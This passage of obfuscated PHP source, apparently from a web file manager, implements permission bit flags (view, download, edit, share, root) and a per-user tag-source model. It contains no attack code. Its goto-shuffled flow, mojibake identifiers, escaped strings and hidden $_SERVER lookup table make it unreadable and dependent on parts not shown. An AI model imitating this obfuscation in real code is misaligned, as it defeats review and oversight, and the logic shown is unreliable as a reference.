return !1; } goto Dï‚ºêåÖÊ; AÕã–©¿´≠: $C–‰à∆«œÏ =& $_SERVER[Öíæ€“”≠éÏË]; $cëèë∑∏¥á = array($C–‰à∆«œÏ[1726] => self::AUTH_VIEW, $C–‰à∆«œÏ[1103] => self::AUTH_DOWNLOAD, $C–‰à∆«œÏ[107] => self::AUTH_UPLOAD, $C–‰à∆«œÏ[1674] => self::AUTH_EDIT, $C–‰à∆«œÏ[1673] => self::AUTH_REMOVE, $C–‰à∆«œÏ[1684] => self::AUTH_SHARE, $C–‰à∆«œÏ[352] => self::AUTH_COMMENT, $C–‰à∆«œÏ[1526] => self::AUTH_EVENT, $C–‰à∆«œÏ[1727] => self::AUTH_ROOT); if (!isset($cëèë∑∏¥á[$EêÓÇØÇ∆ô])) { return; } goto CÛ†¥∆ˆ∂ﬁ; Dï‚ºêåÖÊ: if (($aπ£ÖÀù´∫ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aπ£ÖÀù´∫ & $d¢°Í¶Áùª); goto C¬Ñ†∫…ãÖ; C¬Ñ†∫…ãÖ: } public static function authDisable($b…∂æ„∑ø¨, $Dó≥ä•ÎçØ) { if (intval($b…∂æ„∑ø¨) <= 0) { return 0; } return intval($b…∂æ„∑ø¨) & ~$Dó≥ä•ÎçØ; } public $optionType = "\123\x79\x73\x74\145\155\x2e\x73\x6f\x75\x72\x63\x65\x41\165\x74\x68\114\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\x61\165\x74\x68", "\154\x61\x62\145\154", "\x64\x69\x73\x70\x6c\x61\x79", "\163\171\x73\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $d»¯…∫ú¿⁄ = $this->authDefault(); foreach ($d»¯…∫ú¿⁄ as $fâ´ ∞†ˆñ) { $this->add($fâ´ ∞†ˆñ); } } public function findAuth($Eè∫ŒœÙ¶∂, $b¡ÿ•¶ÕÁÍ) { $AÇËéˆƒŸ≥ =& $_SERVER[Öíæ€“”≠éÏË]; $a·‰ÍÆ±‰˘ = parent::listData(); foreach ($a·‰ÍÆ±‰˘ as $cÂÚ“éõÆÌ) { $BÇ˜≈µÇ‹ = intval($cÂÚ“éõÆÌ[$AÇËéˆƒŸ≥[407]]); if ($BÇ˜≈µÇ‹ <= 0 || $cÂÚ“éõÆÌ[$AÇËéˆƒŸ≥[1728]] == 0) { continue; } if (($BÇ˜≈µÇ‹ & $Eè∫ŒœÙ¶∂) != $Eè∫ŒœÙ¶∂) { continue; } if (($BÇ˜≈µÇ‹ & $b¡ÿ•¶ÕÁÍ) != 0) { continue; } return $cÂÚ“éõÆÌ[$AÇËéˆƒŸ≥[394]]; } return !1; } public function findAuthReadOnly() { $aÙΩÚë˘Ì– = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $C˜ñ¡•Î–¡ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($aÙΩÚë˘Ì–, $C˜ñ¡•Î–¡); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($aª’ôœÈ–È = false, $AŒâ€≠‹áÇ = "\163\157\x72\164", $Eø¡˘’¡◊Ω = false) { return parent::listData($aª’ôœÈ–È, $AŒâ€≠‹áÇ, $Eø¡˘’¡◊Ω); } public function update($Aı‹íÎïû÷, $BØπ¶–ò∆Ú) { $E∂°ª∞ﬁ≤ =& $_SERVER[Öíæ€“”≠éÏË]; $aúíå·…ù® = parent::listData($Aı‹íÎïû÷); $bÓÜÖßááª = $this->findByName($BØπ¶–ò∆Ú[$E∂°ª∞ﬁ≤[28]]); if (!$aúíå·…ù® || $bÓÜÖßááª && $bÓÜÖßááª[$E∂°ª∞ﬁ≤[394]] != $aúíå·…ù®[$E∂°ª∞ﬁ≤[394]]) { return !1; } $this->filterAuth($BØπ¶–ò∆Ú[$E∂°ª∞ﬁ≤[407]]); return parent::update($Aı‹íÎïû÷, $BØπ¶–ò∆Ú); } public function remove($Fƒ√ﬁ‚√ÉÇ) { $F¥ñòç¶µ¢ = parent::listData($Fƒ√ﬁ‚√ÉÇ); if (!$F¥ñòç¶µ¢ || $F¥ñòç¶µ¢[$_SERVER[Öíæ€“”≠éÏË][1180]]) { return !1; } return parent::remove($Fƒ√ﬁ‚√ÉÇ); } public function add($b≠ÀıØıÓÖ = array()) { goto føøúáœáﬂ; b◊ñÆüï⁄∂: $b≠ÀıØıÓÖ = array_merge($dÑ‚ÌªêﬂÎ, $b≠ÀıØıÓÖ); $b≠ÀıØıÓÖ[$A®Æô™≤åÇ[1730]] = $this->getSort(); $this->filterAuth($b≠ÀıØıÓÖ[$A®Æô™≤åÇ[407]]); goto Fƒ∫èå◊∂∫; føøúáœáﬂ: $A®Æô™≤åÇ =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->findByName($b≠ÀıØıÓÖ[$A®Æô™≤åÇ[28]])) { return !1; } $dÑ‚ÌªêﬂÎ = array($A®Æô™≤åÇ[28] => $A®Æô™≤åÇ[33], $A®Æô™≤åÇ[407] => 1, $A®Æô™≤åÇ[1729] => $A®Æô™≤åÇ[1717], $A®Æô™≤åÇ[1728] => 1, $A®Æô™≤åÇ[1180] => 0, $A®Æô™≤åÇ[1730] => 0); goto b◊ñÆüï⁄∂; Fƒ∫èå◊∂∫: return parent::insert($b≠ÀıØıÓÖ); goto fïÉæÊ÷ ©; fïÉæÊ÷ ©: } private function getSort() { $Aƒêœ ˜◊Œ =& $_SERVER[Öíæ€“”≠éÏË]; $aÿ¥≈Ùêü´ = parent::listData(); $Eú‚çäéùö = array_to_keyvalue($aÿ¥≈Ùêü´, $Aƒêœ ˜◊Œ[33], $Aƒêœ ˜◊Œ[1730]); return empty($Eú‚çäéùö) ? 0 : max($Eú‚çäéùö) + 1; } private function filterAuth(&$e¿ä€¶¡ºØ) { goto AƒÓﬂçﬁî§; cè•∑ÙáÜÃ: foreach ($D–È≈Ω∂Ó£ as $c√Ò„’îØú) { if ($e¿ä€¶¡ºØ & $c√Ò„’îØú) { $e©ÓÁí¶≥Á[] = $c√Ò„’îØú; } } if (in_array(self::AUTH_ROOT, $e©ÓÁí¶≥Á)) { $e¿ä€¶¡ºØ = array_sum($D–È≈Ω∂Ó£); return; } $AØûå´íßñ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Cáà‚≠Ûôë; AƒÓﬂçﬁî§: if (!$e¿ä€¶¡ºØ) { return; } $D–È≈Ω∂Ó£ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $e©ÓÁí¶≥Á = array(); goto cè•∑ÙáÜÃ; Cáà‚≠Ûôë: foreach ($e©ÓÁí¶≥Á as $c√Ò„’îØú) { if (isset($AØûå´íßñ[$c√Ò„’îØú])) { $e©ÓÁí¶≥Á = array_merge($e©ÓÁí¶≥Á, $AØûå´íßñ[$c√Ò„’îØú]); } } $e©ÓÁí¶≥Á[] = self::AUTH_SHOW; $e¿ä€¶¡ºØ = array_sum(array_unique($e©ÓÁí¶≥Á)); goto fâ¢ŒÀÎŒ≥; fâ¢ŒÀÎŒ≥: } public function sort($bûÕíø◊†ô, $a±ÿ∂‘Ö‘√) { return parent::update($bûÕíø◊†ô, $a±ÿ∂‘Ö‘√); } } goto DŸÂçç§ÿÔ; döÛµÌœ¨â: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($B¥Ø”ù–éˆ) { $Bõ∑∏–óÇ€ =& $_SERVER[Öíæ€“”≠éÏË]; return array($Bõ∑∏–óÇ€[1814] => array(USER_ID, $Bõ∑∏–óÇ€[1815])); } protected function listData() { $aø⁄œúÿáö =& $_SERVER[Öíæ€“”≠éÏË]; $F¡éå·æã  = array($aø⁄œúÿáö[1529] => USER_ID, $aø⁄œúÿáö[464] => array($aø⁄œúÿáö[1818], 0)); $Aá©”ÿ∞óÑ = $aø⁄œúÿáö[1820]; $BñÇ‹‰©ûæ = $this->field($Aá©”ÿ∞óÑ)->where($F¡éå·æã )->order($aø⁄œúÿáö[1821])->select(); return $BñÇ‹‰©ûæ ? $BñÇ‹‰©ûæ : array(); } protected function listByTag($eêôìº◊áÌ) { } protected function addToTag($Eàºß∑π¨, $dç≠∂éâÚå) { $F«√ÍÌ©è¢ =& $_SERVER[Öíæ€“”≠éÏË]; if (!Model($F«√ÍÌ©è¢[1955])->listData($dç≠∂éâÚå) || !Model($F«√ÍÌ©è¢[803])->pathInfo($Eàºß∑π¨)) { return !1; } $f∫“ü®ª·ë = array($F«√ÍÌ©è¢[1529] => USER_ID, $F«√ÍÌ©è¢[464] => $dç≠∂éâÚå, $F«√ÍÌ©è¢[415] => $Eàºß∑π¨, $F«√ÍÌ©è¢[416] => $F«√ÍÌ©è¢[410], $F«√ÍÌ©è¢[414] => $F«√ÍÌ©è¢[33], $F«√ÍÌ©è¢[1711] => 0); if ($this->where($f∫“ü®ª·ë)->find()) { return !1; } return $this->add($f∫“ü®ª·ë); } protected function removeFromTag($C‘Óæ‰◊Óú, $BÙ†©†ıàÔ) { $AÏÓÖ∞Òâ≤ =& $_SERVER[Öíæ€“”≠éÏË]; if (!Model($AÏÓÖ∞Òâ≤[1955])->listData($BÙ†©†ıàÔ)) { return !1; } if (is_array($C‘Óæ‰◊Óú)) { $C‘Óæ‰◊Óú = array($AÏÓÖ∞Òâ≤[7], $C‘Óæ‰◊Óú); } $FÍœüöÖ∏ã = array($AÏÓÖ∞Òâ≤[1529] => USER_ID, $AÏÓÖ∞Òâ≤[464] => $BÙ†©†ıàÔ, $AÏÓÖ∞Òâ≤[416] => $AÏÓÖ∞Òâ≤[410], $AÏÓÖ∞Òâ≤[415] => $C‘Óæ‰◊Óú); return $this->where($FÍœüöÖ∏ã)->delete(); } protected function removeByTag($EÉÉŒˆ¶ÿ¿) { $d≥È≤ƒÇ†ƒ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$EÉÉŒˆ¶ÿ¿) { return !1; } $c¢Èœ„ªËî = array($d≥È≤ƒÇ†ƒ[1529] => USER_ID, $d≥È≤ƒÇ†ƒ[464] => $EÉÉŒˆ¶ÿ¿); return $this->where($c¢Èœ„ªËî)->delete(); } protected function removeBySource($A˘Õ£®≠÷ä) { $aË§„ùú‰⁄ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_array($A˘Õ£®≠÷ä)) { $A˘Õ£®≠÷ä = array($aË§„ùú‰⁄[7], $A˘Õ£®≠÷ä); } $Bñ®€ºÛ±Ç = array($aË§„ùú‰⁄[1529] => USER_ID, $aË§„ùú‰⁄[415] => $A˘Õ£®≠÷ä, $aË§„ùú‰⁄[464] => array($aË§„ùú‰⁄[982], 0)); return $this->where($Bñ®€ºÛ±Ç)->delete(); } }